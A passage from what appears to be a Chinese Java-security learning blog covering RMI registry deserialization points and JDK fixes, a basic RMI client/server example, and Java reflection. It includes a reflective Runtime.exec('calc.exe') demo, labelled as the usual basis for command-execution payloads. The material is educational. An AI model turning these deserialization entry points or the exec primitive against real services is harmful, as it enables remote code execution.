class="literal">true</span>);</span><br><span class="line">                    var9.writeObject(var8);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var88) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var88);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">try</span> { <span class="comment">// rebind()方法</span></span><br><span class="line">                    var11 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//readObject反序列化触发</span></span><br><span class="line">                    var7 = (String)var11.readObject();</span><br><span class="line">                    var8 = (Remote)var11.readObject();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var85) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var85);</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException var86) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var86);</span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                var6.rebind(var7, var8);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var84) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var84);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">try</span> { <span class="comment">//unbind()方法</span></span><br><span class="line">                    var10 = var2.getInputStream();</span><br><span class="line">                    <span class="comment">//readObject反序列化触发</span></span><br><span class="line">                    var7 = (String)var10.readObject();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var81) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var81);</span><br><span class="line">                } <span class="keyword">catch</span> (ClassNotFoundException var82) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var82);</span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                    var2.releaseInputStream();</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                var6.unbind(var7);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var80) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var80);</span><br><span class="line">                }</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"invalid method number"</span>);</span><br><span class="line">            }</span><br></pre></td></tr></tbody></table></figure><p>这里var3类型是int型，取值从0到4，依次对应bind/rebind/unbind/lookup/list等请求。从这个switch语句我们可以得知，Registry注册中心能够接收bind/rebind/unbind/lookup/list等请求，而在接收五类请求方法的时候，只有我们bind，rebind，unbind和lookup方法进行了反序列化数据调用readObject函数（再给自己挖个坑，后面补个java反序列化的内容），可能导致直接触发了反序列化漏洞产生。</p><blockquote><p>需要说明的是lookup是从rmi client角度攻击rmi registry， 而bind/rebind/unbind是从rmi server角度攻击rmi registry</p></blockquote><p>由于无法下载到对应的jdk版本，这里我无法演示，可以具体看看这个<a href="https://xz.aliyun.com/t/9261?time__1311=n4+xuDgD9DyDRGD07+D/jeFeWqO5OWlQ7eD&amp;alichlgref=https://xz.aliyun.com/u/24696#toc-10">文章</a>是如何利用该处反序列化进行实际操作的。</p><blockquote><p>高版本的jdk中，进行了如下修复：</p><p>在8u121之后，在bind方法里面增加了一个checkAccess方法，该方法会检查是否为localhost，不是则会抛出下面这个异常：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">catch</span> (PrivilegedActionException var4) {</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AccessException</span>(var0 + <span class="string">" disallowed; origin "</span> + var2 + <span class="string">" is non-local host"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>不过我们看源码就知道反序列化语句readObject其实在bind调用之前就执行了，并没有什么用。</p><p>然后在8u141修改为在RegistryImpl_Skel中执行readObject之前就执行了checkAccess方法，这样bind，rebind，unbind就没失效了。</p><p>以我现在手上的java为例(java版本为1.8.0_391),<code>sun.rmi.registry.RegistryImpl_Skel</code>类的<code>dispatch</code>方法中的switch语句对应处理bind请求的片段如下：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                RegistryImpl.checkAccess(<span class="string">"Registry.bind"</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    var10 = (ObjectInputStream)var7.getInputStream();</span><br><span class="line">                    var8 = SharedSecrets.getJavaObjectInputStreamReadString().readString(var10);</span><br><span class="line">                    var81 = (Remote)var10.readObject();</span><br><span class="line">                } <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var78) {</span><br><span class="line">                    var7.discardPendingRefs();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">"error unmarshalling arguments"</span>, var78);</span><br><span class="line">                } <span class="keyword">finally</span> {</span><br><span class="line">                    var7.releaseInputStream();</span><br><span class="line">                }</span><br><span class="line"></span><br><span class="line">                var6.bind(var8, var81);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    var7.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                } <span class="keyword">catch</span> (IOException var77) {</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">"error marshalling return"</span>, var77);</span><br><span class="line">                }</span><br></pre></td></tr></tbody></table></figure><p>可以看到第一句就调用了checkAccess进行了限制。</p></blockquote><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>写这篇时我结合了网上的文章再看的源码，但是还是感觉其中的过程有些绕，对于rmi利用这块，有很多有待去学习。</p><p><em><strong>参考文章:</strong></em></p><p>《java安全漫谈》</p><p><a href="https://xz.aliyun.com/t/9261?time__1311=n4+xuDgD9DyDRGD07+D/jeFeWqO5OWlQ7eD&amp;alichlgref=https://xz.aliyun.com/u/24696#toc-10">RMI机制</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅谈RMI</title>
      <link href="/2024/01/07/%C7%B3%CC%B8RMI/"/>
      <url>/2024/01/07/%C7%B3%CC%B8RMI/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>RMI(Remote Method Invocation),即远程方法调用，在java中，一个JVM上的object可以通过RMI实现远程调用另外一个JVM的object方法。</p><p>RMI有些类似C语言中所用的远程过程调用RPC。RPC主要关注数据结构。将数据打包并传输是相对容易的，但对于Java而言，这还不够。在Java中，我们不仅仅使用数据结构，还使用包含数据和操作数据的方法的对象。我们不仅需要能够将对象的状态（数据）传输到网络中，还需要接收方能够在接收后与对象进行交互（使用其方法）。</p><p>RMI 可以使用以下协议实现：</p><ul><li>Java Remote Method Protocol (JRMP)：专门为 RMI 设计的协议</li><li>Internet Inter-ORB Protocol (IIOP) ：基于 <code>CORBA</code> 实现的跨语言协议</li></ul><p>在很多java反序列化的漏洞的poc中我们都可以看到rmi协议的身影，一般都是利用它来访问一个远程的恶意java对象的。</p><h2 id="0x02-RMI相关概念"><a href="#0x02-RMI相关概念" class="headerlink" title="0x02 RMI相关概念"></a>0x02 RMI相关概念</h2><p>从RMI设计角度来讲，基本分为三层架构模式来实现RMI，分别为RMI注册中心、RMI客户端和RMI服务端。</p><p><strong>注册表(rmi registry):</strong> 是一种名称服务（name service），提供远程对象（remote object）注册，即名称（name）到远程对象的绑定和查询，是一种特殊的远程对象</p><p>说明白些就是以URL形式注册远程对象，并向客户端回复对远程对象的引用。</p><p><strong>客户端（rmi registry）:</strong> 通过名称向 <code>RMI registry</code> 获取远程对象引用<code>remote object reference (stub)</code>，调用其方法，框架如下：</p><p>存根/桩(Stub):远程对象在客户端上的代理;<br>远程引用层(Remote Reference Layer):解析并执行远程引用协议;<br>传输层(Transport):发送调用、传递远程方法参数、接收远程方法执行结果。</p><p><strong>服务端（rmi server）:</strong> 创建远程对象，将其注册到 <code>RMI registry</code>，框架如下：</p><p>骨架(Skeleton):读取客户端传递的方法参数，调用服务器方的实际对象方法， 并接收方法执行后的返回值;<br>远程引用层(Remote Reference Layer):处理远程引用后向骨架发送远程方法调用;<br>传输层(Transport):监听客户端的入站连接，接收并转发调用到远程引用层。</p><p>官方文档的示例图如下：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240107164327165.png" alt="RMI流程图"></p><p>该图描述了一个使用RMI注册表获取远程对象引用的RMI分布式应用程序。服务器调用<code>RMI Registry</code>来将一个名称与一个远程对象关联（或绑定）。客户端在服务器的<code>RMI Registry</code>中通过名称查找远程对象，然后调用其方法。图示还显示了RMI系统在需要时使用现有的Web服务器从服务器到客户端以及从客户端到服务器加载类定义的过程。</p><p><code>RMI server</code> 和<code>RMI registry</code>运行在一个主机的不同端口，<code>RMI registry</code>默认运行在1099端口上。</p><p>RMI URL形式为：<code>rmi://hostname:port/remoteObjectName</code></p><h2 id="0x03-一个RMI实例"><a href="#0x03-一个RMI实例" class="headerlink" title="0x03 一个RMI实例"></a>0x03 一个RMI实例</h2><p>下面在本地演示一个RMI通信：</p><h3 id="接口编写"><a href="#接口编写" class="headerlink" title="接口编写"></a>接口编写</h3><p>Client端需要调用具体的远程方法，所以需要有服务端注册的远程对象类所实现的接口。如果是真实远程通信情况，服务端和客户端都要有该接口，我这里环境是本地。</p><p>编写一个继承自java.rmi.Remote的接口Hello，其中要定义一个我们要调用的远程方法，比如这里的<code>sayHello()</code>,然后需要抛出 <code>RemoteException</code> 或其父类的异常:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Hello</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> {</span><br><span class="line">    String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException; <span class="comment">//定义要调用的远程方法，并抛出RemoteException异常</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>java.rmi.Remote接口是一个空接口，和Serializable接口一样，只作标记作用，接口中的每个方法都需要抛出RemoteException异常。</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240113172036581.png" alt="java.rmi.Remote源码"></p><h3 id="RMI-Server编写"><a href="#RMI-Server编写" class="headerlink" title="RMI Server编写"></a>RMI Server编写</h3><p>编写<strong>RMI Server</strong>类，该类要先实现刚刚编写的Hello接口，在主函数中创建并导出远程对象，然后将远程对象注册到RMI Registry上,具体细节可以看注释：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> <span class="keyword">implements</span> <span class="title class_">Hello</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">RMIServer</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RMIServer</span>();</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">stub</span> <span class="operator">=</span> (Hello) UnicastRemoteObject.exportObject(obj, <span class="number">8888</span>);<span class="comment">//该语句执行后会运行一个 rmi server，监听本地8888端口等待client的请求</span></span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>); <span class="comment">// 该语句执行后会创建并启动 rmi registry，监听在本地 1099 端口</span></span><br><span class="line">            <span class="comment">//exportObject() 方法返回结果为 remote object stub (代理对象，实现了与 Hello 接口同样的方法，包含 rmi server 的 host、port 信息)</span></span><br><span class="line">            registry.bind(<span class="string">"Hello"</span>, stub); <span class="comment">// 将 stub 注册到 registry，并与 name Hello 绑定</span></span><br><span class="line"></span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            System.out.println(<span class="string">"Server Exception: "</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException {</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Hello, World"</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="RMI-Client端编写"><a href="#RMI-Client端编写" class="headerlink" title="RMI Client端编写"></a>RMI Client端编写</h3><p>编写RMI Client类，先通过<code>LocateRegistry.getRegistry</code>方法获取<code>RMI registry</code>,然后通过<code>registry.lookup</code>获取 <code>remote object stub</code>:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> <span class="string">"localhost"</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>; <span class="comment">//RMI registry绑定的端口</span></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(host, port);</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">stub</span> <span class="operator">=</span> (Hello) registry.lookup(<span class="string">"Hello"</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> stub.sayHello();</span><br><span class="line">            System.out.println(<span class="string">"response: "</span> + response);</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            System.err.println(<span class="string">"Client exception: "</span> + e.toString());</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>然后先运行RMIServer.java，再运行 RMIClient.java查看结果，可以看到成功调用sayHello方法：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20240107172912292.png" alt="运行成功"></p><blockquote><p>本例中调用 <code>stub</code> 的 <code>sayHello()</code> 方法背后的流程：</p><ol><li><p><code>RMI client</code> 端通过 <code>stub</code> 中包含的 host、port 信息，与远程对象所在的 <code>RMI server</code> 建立连接 ，然后序列化调用数据</p></li><li><p><code>RMI server</code> 端接收调用请求，将调用转发给远程对象，然后序列化结果，返回给 <code>RMI client</code></p></li><li><p><code>RMI client</code> 端接收、反序列化结果</p></li></ol></blockquote><h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h2><p>在远程方法调用过程中，远程对象需要先序列化，从本地 JVM 发送到远程 JVM，然后在远程 JVM 上反序列化，执行完后，将结果序列化，发送回本地JVM，因此这个过程可能会存在反序列化漏洞。</p><p><strong>参考文章：</strong></p><p><a href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">RMI Overview</a></p><p><a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi/hello/hello-world.html">Getting Started Using Java RMI</a></p><p><a href="https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html">Remote Method Invocation (RMI)</a></p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 0-1 javaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反射机制2</title>
      <link href="/2024/01/05/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B62/"/>
      <url>/2024/01/05/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B62/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>发现关于java反射还有很多内容需要补充，就接着<a href="https://anch0r.top/2023/12/23/java-fan-she-ji-zhi/">java反射机制</a>进一步记录有关反射的内容。</p><h2 id="0x01-关于newInstance-方法"><a href="#0x01-关于newInstance-方法" class="headerlink" title="0x01 关于newInstance()方法"></a>0x01 关于newInstance()方法</h2><p>通过上次的java反射学习，我们知道，通过调用获得来的class对象的newInstance()方法可以实例化一个对象，通过该实例化的对象，我们就可以成功调用对应类中的成员方法。</p><p>但调用<code>newInstance()</code>方法是有条件的，<strong>前提是这个类有无参构造方法，并且构造方法是公有的</strong>，因为<code>newInstance()</code>作用就是调用类的公有的无参构造方法，进而实例化出一个对象。如果一个类没有公有的无参构造函数，那么调用<code>newInstance()</code>就会不成功。</p><p>拿我这篇文章中的<a href="https://anch0r.top/2023/12/23/java-fan-she-ji-zhi/">java反射机制</a>中的 “0x03 java反射价值”中的例子来说明。当时我是利用反射机制先获取<code>java.lang.Runtime</code>(这是我们命令执行构造payload最常用的类)的class对象，然后是获得<code>exec()</code>和<code>getRuntime()</code>这两个成员方法，利用<code>invoke</code>方法先调用<code>getRuntime()</code>方法从而获得一个Runtime对象，然后才调用Runtime对象的<code>exec()</code>执行命令：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>); <span class="comment">// 得到Runtime的class对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> evilClass.getMethod(<span class="string">"exec"</span>, String.class); <span class="comment">// 从中获取exec方法的method实例</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runtimeMethod</span> <span class="operator">=</span> evilClass.getMethod(<span class="string">"getRuntime"</span>); <span class="comment">//从中获取getRuntime方法的method实例</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">evil</span> <span class="operator">=</span> runtimeMethod.invoke(evilClass); <span class="comment">//调用getRuntime方法从而获得一个Runtime类对象（这里invoke传入的参数也可以是null）</span></span><br><span class="line">        method.invoke(evil, <span class="string">"calc.exe"</span>); <span class="comment">// 调用exec方法，运行exec命令，打开一个计算机</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看到这个过程，你可能会感觉到疑惑，为什么非要调用<code>getRuntime()</code>方法获得<code>Runtime</code>对象，而不考虑直接通过其中的<code>evilClass</code>的<code>newInstance()</code>来直接获得<code>Runtime</code>对象？</p><p>确实，上面这么做是显得有些麻烦，但是实践证明，通过<code>newInstance()</code>方法是不可行的，比如我们改成下面这行代码：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> Class.forName(<span class="string">"java.lang.Runtime"</span>); <span class="comment">// 得到Runtime的class对象</span></span><br><span class="line">        evilClass.getMethod(<span class="string">"exec"</span>, String.class).invoke(evilClass.newInstance(), <span class="string">"calc.exe"</span>);</span><br><span class="line">        <span class="comment">//newInstance()实例化出一个Runtime对象，调用其中的exec方法</span></span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这样是变简洁了，但是当运行这段代码时会产生一个报错：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231133903399.png" alt="报错"></p><p>报错中有<code>private</code>这个字眼，我们看看<code>rt.jar</code>包下的<code>java.lang.Runtime</code>类的源码，可以发现其中的无参构造函数是私有方法，很明显，newInstance是不能调用这样的私有无参构造函数的，这就是为什么运行后会报错。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">Runtime</span><span class="params">()</span> {}</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20231231134145735.png" alt="Runtime的私有无参构造函数"></p><p>不太了解java的人这时也许又会产生疑问，为什么会有私有的无参构造方法？真是不想让用户使用这个类才设计的吗？</p><p>其实并不是，这涉及到常见的设计模式：“单例模式”。</p><p>单例模式，说通俗点，就是想要保证一个类仅有一个实例，并且提供一个访问它的全局访问点，主要解决的问题就是程序中对一个类频繁的创造和销毁，导致效率下降。单例模式思路就是将构造函数设置成私有，然后设置一个静态方法来获取该构造方法，这样就不会频繁调用构造函数建立对象了，只需要一次借助对应的静态方法来调用构造函数创建单例。而我之前成功调用exec函数的方法就是用的这个静态方法来实现的。</p><p>Runtime类很明显就是一个单例模式设计的类，它其中有一个静态函数<code>getRuntime()</code>就是用来获取Runtime对象的。(在上一张图中我们可以看到<code>getRuntime()</code>函数代码)所以，就有这样的思路，利用getMethod方法拿到getRuntime的Method对象，通过调用它从而获得Runtime对象。</p><h2 id="0x02-Constructor类"><a href="#0x02-Constructor类" class="headerlink" title="0x02 Constructor类"></a>0x02 Constructor类</h2><p>看到上面的例子后，疑问又产生了，如果有这样一个类，它没有无参构造方法(或者是无参构造方法私有)，也没有单例模式中的静态方法，那么怎么通过反射机制来实现实例化操作呢？</p><p>解决上面这个问题，这里得引入反射中一个大类，<code>Constructor</code>。在上一篇java反射中我只提及了<code>Class</code>类和<code>Method</code>类，当时以为<code>Constructor</code>类并不是很重要，就把它给遗漏了，没想到它在安全中还是有作用的。</p><p>Constructor类存在于反射包(java.lang.reflect)中，反映的是Class 对象所表示的类的构造方法。在反射中，一个类的Constructor对象是可以通过Class类中的成员方法获得的，相关的方法如下：</p><table><thead><tr><th>方法返回值</th><th>方法名称</th><th>方法说明</th></tr></thead><tbody><tr><td>static Class&lt;?&gt;</td><td>forName(String className)</td><td>返回与带有给定字符串名的类或接口相关联的 Class 对象。</td></tr><tr><td>Constructor</td><td>getConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回指定参数类型、具有public访问权限的构造函数对象</td></tr><tr><td>Constructor&lt;?&gt;[]</td><td>getConstructors()</td><td>返回所有具有public访问权限的构造函数的Constructor对象数组</td></tr><tr><td>Constructor</td><td>getDeclaredConstructor(Class&lt;?&gt;… parameterTypes)</td><td>返回指定参数类型、所有声明的（包括private）构造函数对象</td></tr><tr><td>Constructor&lt;?&gt;[]</td><td>getDeclaredConstructors()</td><td>返回所有声明的（包括private）构造函数对象</td></tr><tr><td>T</td><td>newInstance()</td><td>调用无参构造器创建此 Class 对象所表示的类的一个新实例。</td></tr></tbody></table><p>常用的是其中的<code>getConstructor</code>方法，和<code>getMethod</code>方法类似<code>getConstructor</code>接收的参数是构造函数列表类型，因为构造函数也支持重载，所以必须用参数列表类型才能唯一确定一个构造函数。通过<code>getConstructor</code>这些方法，我们不仅可以解决上面没有无参构造函数的问题，还可以任意调用自己需要的那个构造函数。</p><p>我们先以上次的<code>User</code>类为例尝试调用其中的构造函数,一共是三个调用函数，分别是无参、只有一个参数以及有两个参数的构造函数，其中只有一个参数的构造函数是私有的。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Anchor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> {</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span 